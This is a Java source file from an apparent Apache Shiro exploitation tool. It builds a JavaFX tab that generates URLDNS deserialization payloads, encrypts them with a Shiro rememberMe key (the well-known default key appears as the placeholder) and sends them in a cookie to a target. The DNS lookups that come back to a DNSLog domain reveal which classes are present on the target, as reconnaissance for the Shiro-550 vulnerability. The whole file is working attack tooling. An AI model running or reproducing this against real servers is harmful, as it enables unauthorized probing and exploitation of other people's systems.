package com.y5neko.shiroexp.ui.tabpane;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.config.GlobalVariable;
import com.y5neko.shiroexp.gadget.FindClassByURLDNS;
import com.y5neko.shiroexp.misc.DnslogConfig;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Task;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import okhttp3.FormBody;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * URLDNS 类探测 Tab
 * 通过 DNS 请求探测目标是否存在指定依赖类
 */
public class URLDNSTab {
    // 静态引用，用于外部更新UI
    private static URLDNSTab instance;

    private TextField cookieTextField;
    private TextField targetUrlTextField;
    private TextField rememberMeTextField;
    private TextField rememberMeFlagTextField;

    /**
     * 追加日志并自动滚动到底部的辅助方法
     * @param logTextArea 日志文本框
     * @param text 要追加的文本
     */
    private void appendLogWithScroll(TextArea logTextArea, String text) {
        logTextArea.appendText(text);
        logTextArea.setScrollTop(Double.MAX_VALUE);
    }

    public VBox getURLDNSTab() {
        // 注册实例
        instance = this;
        VBox urlDnsTab = new VBox();
        urlDnsTab.setSpacing(10);
        urlDnsTab.setPadding(new Insets(10));

        // ========================== 第一行：目标地址配置 ==========================
        HBox targetUrlBox = new HBox();
        targetUrlBox.setAlignment(Pos.CENTER);
        targetUrlBox.setSpacing(10);

        Label targetUrlLabel = new Label("目标地址:");
        targetUrlTextField = new TextField();
        targetUrlTextField.setPromptText("http://example.com");
        HBox.setHgrow(targetUrlTextField, javafx.scene.layout.Priority.ALWAYS);

        Label rememberMeLabel = new Label("RememberMe Key:");
        rememberMeTextField = new TextField();
        rememberMeTextField.setPromptText("kPH+bIxk5D2deZiIxcaaaA==");
        HBox.setHgrow(rememberMeTextField, javafx.scene.layout.Priority.ALWAYS);

        Label rememberMeFlagLabel = new Label("Cookie名称:");
        rememberMeFlagTextField = new TextField("rememberMe");
        HBox.setHgrow(rememberMeFlagTextField, javafx.scene.layout.Priority.ALWAYS);

        targetUrlBox.getChildren().addAll(targetUrlLabel, targetUrlTextField, rememberMeLabel, rememberMeTextField, rememberMeFlagLabel, rememberMeFlagTextField);

        // ========================== 第二行：类选择 ==========================
        HBox classBox = new HBox();
        classBox.setAlignment(Pos.CENTER);
        classBox.setSpacing(10);

        Label classLabel = new Label("探测类:");
        ObservableList<String> classes = FXCollections.observableArrayList("探测所有类");
        classes.addAll(AllList.urlDnsClasses);
        ComboBox<String> classComboBox = new ComboBox<>(classes);
        classComboBox.setValue("探测所有类");
        HBox.setHgrow(classComboBox, javafx.scene.layout.Priority.ALWAYS);

        Label dnslogDomainLabel = new Label("DNSLog域名:");
        TextField dnslogDomainTextField = new TextField();
        dnslogDomainTextField.setPromptText("留空使用设置中的域名或自动获取");
        HBox.setHgrow(dnslogDomainTextField, javafx.scene.layout.Priority.ALWAYS);

        Button detectButton = new Button("开始探测");

        classBox.getChildren().addAll(classLabel, classComboBox, dnslogDomainLabel, dnslogDomainTextField, detectButton);

        // ========================== 第三行：高级配置 ==========================
        TitledPane advancedConfigPane = new TitledPane();
        advancedConfigPane.setText("高级配置");
        advancedConfigPane.setCollapsible(true);
        advancedConfigPane.setExpanded(false);

        VBox advancedConfigContent = new VBox();
        advancedConfigContent.setSpacing(10);
        advancedConfigContent.setPadding(new Insets(10, 0, 10, 0));

        HBox cookieBox = new HBox();
        cookieBox.setAlignment(Pos.CENTER);
        cookieBox.setSpacing(10);

        Label cookieLabel = new Label("Cookie:");
        cookieTextField = new TextField();
        cookieTextField.setPromptText("例: key=value; key2=value2");
        HBox.setHgrow(cookieTextField, javafx.scene.layout.Priority.ALWAYS);

        cookieBox.getChildren().addAll(cookieLabel, cookieTextField);
        advancedConfigContent.getChildren().add(cookieBox);
        advancedConfigPane.setContent(advancedConfigContent);

        // ========================== 第四行：日志区域 ==========================
        VBox logContainer = new VBox();
        logContainer.setSpacing(10);
        logContainer.setPadding(new Insets(10, 0, 0, 0));
        logContainer.setFillWidth(true);

        TextArea logTextArea = new TextArea();
        logTextArea.setEditable(false);
        logTextArea.setWrapText(true);

        // 按钮区域
        Button clearLogButton = new Button("清空日志");
        HBox buttonBox = new HBox(10);
        buttonBox.setAlignment(Pos.CENTER_RIGHT);
        buttonBox.getChildren().add(clearLogButton);

        // 组装日志区域：TextArea 占据所有可用空间，buttonBox 固定在底部
        logContainer.getChildren().addAll(logTextArea, buttonBox);

        // 关键：让 TextArea 在 logContainer 中占据所有剩余垂直空间
        VBox.setVgrow(logTextArea, javafx.scene.layout.Priority.ALWAYS);

        // 关键：让 logContainer 在主 VBox (urlDnsTab) 中占据所有剩余垂直空间
        VBox.setVgrow(logContainer, javafx.scene.layout.Priority.ALWAYS);

        // ========================== 事件绑定 ==========================
        detectButton.setOnMouseClicked(event -> {
            // 验证输入
            if (targetUrlTextField.getText().trim().isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请输入目标地址\n");
                return;
            }

            if (rememberMeTextField.getText().trim().isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请输入 RememberMe Key\n");
                return;
            }

            String selectedClass = classComboBox.getValue();
            if (selectedClass == null || selectedClass.isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请选择要探测的类\n");
                return;
            }

            detectButton.setDisable(true);
            appendLogWithScroll(logTextArea, "[INFO]开始 URLDNS 类探测...\n");

            // 异步执行探测任务
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() {
                    try {
                        // 创建目标对象
                        TargetOBJ targetOBJ = new TargetOBJ(targetUrlTextField.getText().trim());
                        targetOBJ.setKey(rememberMeTextField.getText().trim());
                        targetOBJ.setRememberMeFlag(rememberMeFlagTextField.getText().trim());

                        // 应用高级配置（Cookie）
                        if (cookieTextField != null && !cookieTextField.getText().trim().isEmpty()) {
                            Map<String, String> headers = new HashMap<>();
                            headers.put("Cookie", cookieTextField.getText().trim());
                            targetOBJ.setHeaders(headers);
                        }

                        // 获取 DNSLog 域名
                        String dnslogDomain = dnslogDomainTextField.getText().trim();
                        if (dnslogDomain.isEmpty()) {
                            // 尝试从全局变量获取
                            dnslogDomain = GlobalVariable.getDnslogDomain();
                        }

                        final String[] dnslogInfoHolder = new String[3]; // [domain, key, token]
                        if (dnslogDomain == null || dnslogDomain.isEmpty()) {
                            // 自动获取 DNSLog 域名
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]正在从 dnslog.org 获取域名...\n"));
                            String[] dnslogInfo = DnslogConfig.getDnslogDomain();
                            dnslogDomain = dnslogInfo[0];
                            dnslogInfoHolder[0] = dnslogInfo[0];
                            dnslogInfoHolder[1] = dnslogInfo[1];
                            dnslogInfoHolder[2] = dnslogInfo[2];
                            Platform.runLater(() -> {
                                appendLogWithScroll(logTextArea, "[INFO]DNSLog 域名: " + dnslogInfoHolder[0] + "\n");
                                appendLogWithScroll(logTextArea, "[INFO]查询 Token: " + dnslogInfoHolder[2] + "\n");
                            });
                        } else {
                            final String finalDomain = dnslogDomain;
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]使用配置的 DNSLog 域名: " + finalDomain + "\n"));
                        }

                        // 确定要探测的类列表
                        java.util.List<String> classesToDetect = new java.util.ArrayList<>();
                        if ("探测所有类".equals(selectedClass)) {
                            classesToDetect.addAll(java.util.Arrays.asList(AllList.urlDnsClasses));
                        } else {
                            classesToDetect.add(selectedClass);
                        }

                        // 统计类名出现次数，用于处理重名
                        final java.util.Map<String, Integer> classNameCount = new java.util.HashMap<>();
                        final java.util.Map<String, String> classNameToIndex = new java.util.HashMap<>();

                        // 遍历探测每个类
                        final String finalDnslogDomain = dnslogDomain;
                        for (String clazz : classesToDetect) {
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]正在探测类: " + clazz + "\n"));

                            try {
                                // 生成随机标识符
                                String verifyRandom = Tools.generateRandomString(8);

                                // 提取类名（不含包名）作为 DNS 标识
                                String simpleClassName = clazz.substring(clazz.lastIndexOf('.') + 1);

                                // 处理重名：统计该类名出现的次数
                                synchronized (classNameCount) {
                                    int count = classNameCount.getOrDefault(simpleClassName, 0) + 1;
                                    classNameCount.put(simpleClassName, count);

                                    // 如果是第2次及以后出现，添加数字后缀
                                    if (count > 1) {
                                        simpleClassName = simpleClassName + count;
                                        classNameToIndex.put(clazz, simpleClassName);
                                    } else {
                                        classNameToIndex.put(clazz, simpleClassName);
                                    }
                                }

                                // 创建最终副本供lambda使用
                                final String finalSimpleClassName = simpleClassName;

                                // 构建 DNSLog URL：随机值-类名.主域名
                                String dnslogUrl = "http://" + verifyRandom + "-" + finalSimpleClassName + "." + finalDnslogDomain;

                                // 生成 URLDNS payload
                                byte[] payloadBytes = FindClassByURLDNS.genPayload(dnslogUrl, clazz);
                                String payload = Tools.CBC_Encrypt(targetOBJ.getKey(), Base64.getEncoder().encodeToString(payloadBytes));

                                // 构造请求头
                                Map<String, String> headers = new HashMap<>();
                                String cookieValue = targetOBJ.getRememberMeFlag() + "=" + payload;
                                if (targetOBJ.getHeaders() != null && targetOBJ.getHeaders().containsKey("Cookie")) {
                                    // 合并 Cookie
                                    cookieValue = targetOBJ.getHeaders().get("Cookie") + "; " + cookieValue;
                                }
                                headers.put("Cookie", cookieValue);

                                // 发送 payload
                                HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, "GET");

                                Platform.runLater(() -> {
                                    appendLogWithScroll(logTextArea, "   -> DNS记录: " + verifyRandom + "-" + finalSimpleClassName + "." + finalDnslogDomain + "\n");
                                });

                                // 如果是单个类探测，等待并查询 DNS 记录
                                if (classesToDetect.size() == 1) {
                                    Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]等待 5 秒后查询 DNS 记录...\n"));
                                    Thread.sleep(5000);

                                    // 这里应该查询 DNSLog 平台，但由于需要保存 token，简化处理
                                    Platform.runLater(() -> {
                                        appendLogWithScroll(logTextArea, "[INFO]探测完成！\n");
                                        appendLogWithScroll(logTextArea, "[提示]请手动访问 DNSLog 平台查询 DNS 记录\n");
                                        appendLogWithScroll(logTextArea, "[提示]如果看到 DNS 请求，说明目标存在该类\n");
                                    });
                                }
                            } catch (Exception e) {
                                final String errorMsg = e.getMessage();
                                Platform.runLater(() -> {
                                    appendLogWithScroll(logTextArea, "[EROR]探测失败: " + clazz + "\n");
                                    if (errorMsg != null) {
                                        appendLogWithScroll(logTextArea, "   -> 错误: " + errorMsg + "\n");
                                    }
                                });
                            }
                        }

                        // 打印完整类名和 DNS 记录的对应关系
                        Platform.runLater(() -> {
                            appendLogWithScroll(logTextArea, "========================================\n");
                            appendLogWithScroll(logTextArea, "[INFO]批量探测完成！\n");
                            appendLogWithScroll(logTextArea, "----------\n");
                            appendLogWithScroll(logTextArea, "[完整类名 → DNS记录] 对应关系：\n");
                            appendLogWithScroll(logTextArea, "----------\n");
                            for (java.util.Map.Entry<String, String> entry : classNameToIndex.entrySet()) {
                                String fullClassName = entry.getKey();
                                String dnsClassName = entry.getValue();
                                appendLogWithScroll(logTextArea, fullClassName + "\n");
                                appendLogWithScroll(logTextArea, "  → " + dnsClassName + "\n");
                            }
                            appendLogWithScroll(logTextArea, "----------\n");
                            appendLogWithScroll(logTextArea, "[提示]请访问 DNSLog 平台查看 DNS 记录\n");
                            appendLogWithScroll(logTextArea, "[提示]如果看到某条 DNS 记录，说明目标存在该类\n");
                            appendLogWithScroll(logTextArea, "========================================\n");
                        });

                    } catch (Exception e) {
                        final String errorMsg = e.getMessage();
                        Platform.runLater(() -> {
                            appendLogWithScroll(logTextArea, "[EROR]" + (errorMsg != null ? errorMsg : "探测失败") + "\n");
                        });
                    }
                    return null;
                }

                @Override
                protected void succeeded() {
                    detectButton.setDisable(false);
                }

                @Override
                protected void failed() {
                    detectButton.setDisable(false);
                }
            };
            new Thread(task).start();
        });

        clearLogButton.setOnMouseClicked(event -> {
            logTextArea.clear();
        });

        // ========================== 组装界面 ==========================
        urlDnsTab.getChildren().addAll(targetUrlBox, classBox, advancedConfigPane, logContainer);
        return urlDnsTab;
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag) {
        if (targetUrlTextField != null && !targetUrl.trim().isEmpty()) {
            targetUrlTextField.setText(targetUrl);
        }
        if (rememberMeTextField != null && !key.trim().isEmpty()) {
            rememberMeTextField.setText(key);
        }
        if (rememberMeFlagTextField != null && !rememberMeFlag.trim().isEmpty()) {
            rememberMeFlagTextField.setText(rememberMeFlag);
        }
    }

    /**
     * 静态方法：更新当前实例的配置
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag) {
        if (instance != null) {
            javafx.application.Platform.runLater(() -> {
                instance.updateFromShiro550(targetUrl, key, rememberMeFlag);
            });
        }
    }
}
